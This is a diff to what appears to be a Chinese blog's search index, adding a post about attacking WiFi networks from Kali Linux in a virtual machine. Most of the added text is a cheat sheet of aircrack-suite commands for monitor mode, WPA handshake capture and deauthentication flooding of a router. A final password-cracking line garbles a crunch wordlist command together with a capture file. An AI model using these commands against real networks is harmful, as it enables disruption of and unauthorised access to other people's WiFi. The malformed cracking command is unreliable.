@@ -483,8 +483,17 @@ print<span class="token punctuation">(</span><span class="token string">"生成�
     <url>/2021/07/15/%E5%9C%A8linux%E8%99%9A%E6%8B%9F%E6%9C%BAkali%E4%B8%AD%E7%9A%84wifi%E6%97%A0%E7%BA%BF%E6%94%BB%E5%87%BB/</url>
     <content><![CDATA[<h2 id="攻击准备"><a href="#攻击准备" class="headerlink" title="攻击准备"></a>攻击准备</h2><ol>
 <li>VM虚拟机</li>
+<li>linux kail系统</li>
 <li>外接网卡rlt8187</li>
 </ol>
+<h2 id="攻击用linux常见指令"><a href="#攻击用linux常见指令" class="headerlink" title="攻击用linux常见指令"></a>攻击用linux常见指令</h2><pre><code class="bash">iwconfig #显示网卡设备
+airmon-ng start wlan0 #激活网卡设备
+airmon-ng stop wlan0 #关闭网卡
+airodump-ng wlan0mon #启用已激活的wlan0监听wifi
+airodump-ng -c [信道ch] -w /root/cap/er8 --bssid [MAC] wlan0mon  #获取握手协议包储存在目录/root/cap/下
+aireplay-ng -0 5 -a [mac] wlan0mon #发起5次攻击，使路由器重启，然后获得握手包裹
+crunch 10 10 123 &gt;&gt;/root.123.txt /root/cap/er8-01.cap 使用指定目录密码本进行破译握手包
+</code></pre>
 ]]></content>
       <tags>
         <tag>kali 网络 linux</tag>
